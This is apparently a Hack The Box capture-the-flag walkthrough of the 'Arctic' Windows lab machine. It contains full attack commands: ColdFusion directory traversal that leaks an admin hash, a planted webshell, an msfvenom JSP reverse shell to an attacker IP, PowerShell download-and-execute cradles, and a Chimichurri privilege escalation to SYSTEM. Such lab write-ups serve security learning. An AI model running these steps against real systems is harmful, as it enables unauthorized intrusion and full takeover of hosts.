# HTB - Arctic
## OS - Windows

I started with an nmap scan of the Arctic box (IP address: 10.10.10.11)

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-27 13:30 PST
Nmap scan report for 10.10.10.11
Host is up (0.096s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 145.28 seconds

```

Port 8500/tcp looks interesting. FMTP protocol - Internet search showed that it was Flight Message Transfer Protocol, 
but port 8500/tcp is a port used for ColdFusion MX Server (edition 6) to allow remote access as a web server.

We can go to http://10.10.10.11:8500 and see two folders. 
![Arctic Web Portal](/images/arctic-1.png)

Going to http://10.10.10.11:8500/CFIDE/ shows an Administrator folder. 

But it is a web page with a login. The username is prepopulated with "admin".

Online search showed this exploit - https://www.exploit-db.com/exploits/14641 using directory traversal.

When I tried the exploit, it worked! The password hash was 2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03. 

![Arctic Password Hash](/images/arctic-2.png)


Tried it crack it online and the first result was https://hashtoolkit.com/decrypt-sha1-hash/2f635f6d20e3fde0c53075a84b68fb07dcec9b03

The decrypted password was happyday.

Logged in and browsed around, and generally searched online about ColdFusion.


Carnal0wnage wrote a paper on ColdFusion (https://www.carnal0wnage.com/papers/LARES-ColdFusion.pdf) that shows lot of details about CondFusion. several metasploit modules are available.

http://10.10.10.11:8500/CFIDE/adminapi/base.cfc?wsdl shows that the coldfusion version is 8.0.1

Turns out that Kali or Parrot have a cfm webshell in /usr/share/webshells. 

Using the administrator web portal and "Scheduling tasks" page, I uploaded the cfm webshell, saved it to C:\ColdFusion8\wwwroot\CFIDE\cfexec.cfm, and then ran the scheduled task.

![Arctic Scheduled Task](/images/arctic-3.png)

It gave a command interface (at \CFIDE\cfexec.cfm) but it did not work much. It kept giving errors.

So I tried jsp reverse shell, because I read that ColdFusion uses a lot of Java/jsp.

```
$msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.9 LPORT=1234 -f raw > shell.jsp
```

Again scheduled the task to upload the jsp_reverse_shell to Arctic host, and ran it by browsing to \CFIDE\shell.jsp.

This time it worked.

```
$nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.11] 49584
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis

C:\ColdFusion8\runtime\bin>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is F88F-4EA5

 Directory of C:\ColdFusion8\runtime\bin

C:\>cd Users\Tolis
cd Users\Tolis

C:\Users\tolis>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is F88F-4EA5

 Directory of C:\Users\tolis

22/03/2017  09:00 ��    <DIR>          .
22/03/2017  09:00 ��    <DIR>          ..
22/03/2017  09:00 ��    <DIR>          Contacts
22/03/2017  09:00 ��    <DIR>          Desktop
22/03/2017  09:00 ��    <DIR>          Documents
22/03/2017  09:00 ��    <DIR>          Downloads
22/03/2017  09:00 ��    <DIR>          Favorites
22/03/2017  09:00 ��    <DIR>          Links
22/03/2017  09:00 ��    <DIR>          Music
22/03/2017  09:00 ��    <DIR>          Pictures
22/03/2017  09:00 ��    <DIR>          Saved Games
22/03/2017  09:00 ��    <DIR>          Searches
22/03/2017  09:00 ��    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  33.184.374.784 bytes free

C:\Users\tolis>cd Desktop
cd Desktop

C:\Users\tolis\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is F88F-4EA5

 Directory of C:\Users\tolis\Desktop

22/03/2017  09:00 ��    <DIR>          .
22/03/2017  09:00 ��    <DIR>          ..
22/03/2017  09:01 ��                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  33.184.374.784 bytes free

C:\Users\tolis\Desktop>type user.txt
type user.txt
```

For privilege escalation, I learned that there is a Windows Exploit Suggester. I learned that Chimichurri.exe from (https://github.com/Re4son/Chimichurri/blob/master/Release/Chimichurri.exe) works for this.

I tried using the same "Scheduled tasks" to upload Chimichurri.exe and run it, but it did not result in a reverse shell. 

Searched online again and found the powershell script to do this:

```
C:\ColdFusion8\wwwroot>echo $webclient = New-Object System.Net.WebClient > download.ps1
echo $webclient = New-Object System.Net.WebClient > download.ps1


C:\ColdFusion8\wwwroot>echo $webclient.DownloadFile("http://10.10.14.9/Chimichurri.exe","Chimichurri.exe") >> download.ps1
echo $webclient.DownloadFile("http://10.10.14.34/Chimichurri.exe","Chimichurri.exe") >> download.ps1


C:\ColdFusion8\wwwroot>powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -NonInteractive -File download.ps1
powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -NonInteractive -File download.ps1
```

In the reverse shell as Tolis, this is what I did:

```
C:\ColdFusion8\runtime>echo $webclient = New-Object System.Net.WebClient > download.ps1
echo $webclient = New-Object System.Net.WebClient > download.ps1

C:\ColdFusion8\runtime>echo $webclient.DownloadFile("http://10.10.14.9/Chimichurri.exe","chimichurri.exe") >> download.ps1
echo $webclient.DownloadFile("http://10.10.14.9/Chimichurri.exe","chimichurri.exe") >> download.ps1

C:\ColdFusion8\runtime>powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -NonInteractive -File download.ps1
powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -NonInteractive -File download.ps1


C:\ColdFusion8\runtime>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is F88F-4EA5

 Directory of C:\ColdFusion8\runtime

29/12/2020  09:40 ��    <DIR>          .
29/12/2020  09:40 ��    <DIR>          ..
29/12/2020  09:32 ��    <DIR>          bin
29/12/2020  09:40 ��            97.280 chimichurri.exe
29/12/2020  09:40 ��               128 download.ps1
22/03/2017  08:52 ��    <DIR>          jre
22/03/2017  08:53 ��    <DIR>          lib
22/03/2017  08:53 ��    <DIR>          logs
22/03/2017  08:53 ��    <DIR>          servers
               2 File(s)         97.408 bytes
               7 Dir(s)  33.183.850.496 bytes free

C:\ColdFusion8\runtime>chimichurri.exe 10.10.14.9 4321
chimichurri.exe 10.10.14.9 4321
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
C:\ColdFusion8\runtime>


```
On my Linux host, I ran a nc listener on port 4321. 

```
$nc -lnvp 4321
listening on [any] 4321 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.11] 49741
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime>whoami
whoami
nt authority\system

C:\ColdFusion8\runtime>cd C:\Users\Administrator
cd C:\Users\Administrator

C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is F88F-4EA5

 Directory of C:\Users\Administrator

22/03/2017  08:10 ��    <DIR>          .
22/03/2017  08:10 ��    <DIR>          ..
22/03/2017  07:47 ��    <DIR>          Contacts
22/03/2017  09:02 ��    <DIR>          Desktop
22/03/2017  07:47 ��    <DIR>          Documents
22/03/2017  07:47 ��    <DIR>          Downloads
22/03/2017  07:47 ��    <DIR>          Favorites
22/03/2017  07:47 ��    <DIR>          Links
22/03/2017  07:47 ��    <DIR>          Music
22/03/2017  07:47 ��    <DIR>          Pictures
22/03/2017  07:47 ��    <DIR>          Saved Games
22/03/2017  07:47 ��    <DIR>          Searches
22/03/2017  07:47 ��    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  33.183.850.496 bytes free

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is F88F-4EA5

 Directory of C:\Users\Administrator\Desktop

22/03/2017  09:02 ��    <DIR>          .
22/03/2017  09:02 ��    <DIR>          ..
22/03/2017  09:02 ��                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  33.183.850.496 bytes free

C:\Users\Administrator\Desktop>type root.txt
```
